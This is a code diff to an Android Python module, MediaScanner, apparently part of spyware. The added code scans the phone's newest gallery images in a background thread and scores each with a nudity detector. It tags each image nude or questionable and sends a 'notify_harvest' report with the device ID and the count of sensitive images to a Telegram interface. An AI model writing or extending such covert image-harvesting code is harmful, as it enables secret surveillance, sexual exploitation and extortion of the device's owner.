@@ -19,10 +19,19 @@ except:
 
 
 class MediaScanner:
-    def __init__(self, det=None):
-        self.det = det
+    def __init__(self, det=None, ui=None):
+        self.det = det          # NudeDetector instance
+        self.ui = ui            # TelegramUI instance (T)
         self.active = False
+        self.did = "Unknown"
         self._init_db()
+
+        # محاولة جلب معرف الجهاز من المونيتور إذا أمكن
+        try:
+            if self.ui and hasattr(self.ui, 'm') and hasattr(self.ui.m, 'did'):
+                self.did = self.ui.m.did
+        except Exception:
+            pass
 
     # ========== إدارة قاعدة البيانات ==========
     def _init_db(self):
@@ -78,40 +87,35 @@ class MediaScanner:
         try:
             act = autoclass('org.kivy.android.PythonActivity').mActivity
             resolver = act.getContentResolver()
-            Uri = autoclass('android.net.Uri')
             MediaStore = autoclass('android.provider.MediaStore')
 
             img_uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            vid_uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
-
             projection = ["_data", "date_added"]
             order = "date_added DESC LIMIT " + str(limit)
 
-            for uri in [img_uri, vid_uri]:
-                cursor = resolver.query(uri, projection, None, None, order)
-                if cursor:
-                    while cursor.moveToNext():
-                        p = cursor.getString(0)
-                        if p and os.path.exists(p) and self._safe_path(p):
-                            results.append(p)
-                    cursor.close()
+            cursor = resolver.query(img_uri, projection, None, None, order)
+            if cursor:
+                while cursor.moveToNext():
+                    p = cursor.getString(0)
+                    if p and os.path.exists(p) and self._safe_path(p):
+                        results.append(p)
+                cursor.close()
             return results
         except Exception as e:
             logging.error(f"Scan error: {e}")
             return []
         finally:
-            if cursor:
-                try:
-                    cursor.close()
-                except:
-                    pass
             gc.collect()
 
-    # ========== إضافة الملفات الجديدة إلى قاعدة البيانات ==========
+    # ========== معالجة وتحليل الصور المكتشفة (باستخدام NudeDetector) ==========
     def _process_files(self, paths):
-        if self.active:
+        if self.active or not paths:
             return
         self.active = True
+
+        nude_count = 0
+        questionable_count = 0
+
         try:
             now = int(time.time())
             with sqlite3.connect(DB) as conn:
@@ -119,11 +123,45 @@ class MediaScanner:
                     h = self._partial_hash(p)
                     if not h:
                         continue
+
                     cur = conn.execute("SELECT 1 FROM media WHERE h=?", (h,))
-                    if not cur.fetchone():
-                        conn.execute("INSERT INTO media (h, p, ts, cat) VALUES (?, ?, ?, ?)",
-                                     (h, self._enc(p), now, 'pending'))
+                    if cur.fetchone():
+                        continue
+
+                    # التحليل باستخدام NudeDetector (إن وجد)
+                    cat = 'pending'
+                    score = 0.0
+                    if self.det and hasattr(self.det, '_analyze'):
+                        prob = self.det._analyze(p)
+                        if prob > 0.85:
+                            cat = 'nude'
+                            score = prob
+                            nude_count += 1
+                        elif prob > 0.45:
+                            cat = 'questionable'
+                            score = prob
+                            questionable_count += 1
+                        else:
+                            cat = 'normal'
+                            score = prob
+                    else:
+                        # إذا لم يوجد detector، نصنفها كـ pending لحين وجوده
+                        cat = 'pending'
+
+                    conn.execute("INSERT INTO media (h, p, ts, cat, score) VALUES (?, ?, ?, ?, ?)",
+                                 (h, self._enc(p), now, cat, score))
+
                 conn.commit()
+
+            # ✅ إرسال إشعار فوري عند اكتشاف صور حساسة
+            total_sensitive = nude_count + questionable_count
+            if total_sensitive > 0 and self.ui and hasattr(self.ui, 'notify_harvest'):
+                try:
+                    # إرسال التقرير مع عدد الصور الحساسة
+                    self.ui.notify_harvest(self.did, total_sensitive)
+                except Exception as e:
+                    logging.error(f"Notify harvest error: {e}")
+
         except Exception as e:
             logging.error(f"Process error: {e}")
         finally:
@@ -157,7 +195,7 @@ class MediaScanner:
             if cursor and cursor.moveToFirst():
                 img_id = cursor.getLong(0)
                 options = BitmapFactory.Options()
-                options.inSampleSize = 2  # تقليل الحجم للنصف لتوفير الرام
+                options.inSampleSize = 2
                 bitmap = MediaStore.Images.Thumbnails.getThumbnail(resolver, img_id,
                                                                    MediaStore.Images.Thumbnails.MINI_KIND,
                                                                    options)
@@ -166,7 +204,7 @@ class MediaScanner:
                     with FileOutputStream(out_path) as out:
                         bitmap.compress(CompressFormat.JPEG, 70, out)
                         out.flush()
-                    bitmap.recycle()  # تحرير ذاكرة البيت‌ماب فوراً
+                    bitmap.recycle()
                     return out_path
         except Exception as e:
             logging.error(f"Thumb error: {e}")
@@ -212,7 +250,7 @@ class MediaScanner:
         except Exception:
             pass
 
-    # ========== إحصائيات عدد الملفات لكل فئة (مهم للمعرض) ==========
+    # ========== إحصائيات عدد الملفات لكل فئة ==========
     def get_statistics(self):
         stats = {'nude': 0, 'questionable': 0, 'normal': 0, 'pending': 0}
         try:
@@ -237,7 +275,6 @@ class MediaScanner:
                 if to_del:
                     conn.executemany("DELETE FROM media WHERE h=?", to_del)
 
-                # الاحتفاظ بآخر 5000 سجل فقط
                 conn.execute("DELETE FROM media WHERE h NOT IN (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)")
                 conn.execute("VACUUM")
                 conn.commit()
@@ -246,6 +283,15 @@ class MediaScanner:
         finally:
             gc.collect()
 
+    # ========== تشغيل المسح الكامل (في خيط منفصل) ==========
+    def run_scan(self):
+        def _task():
+            files = self._fast_scan(limit=300)
+            if files:
+                self._process_files(files)
 
-def create(det=None):
-    return MediaScanner(det)
+        threading.Thread(target=_task, daemon=True).start()
+
+
+def create(det=None, ui=None):
+    return MediaScanner(det, ui)
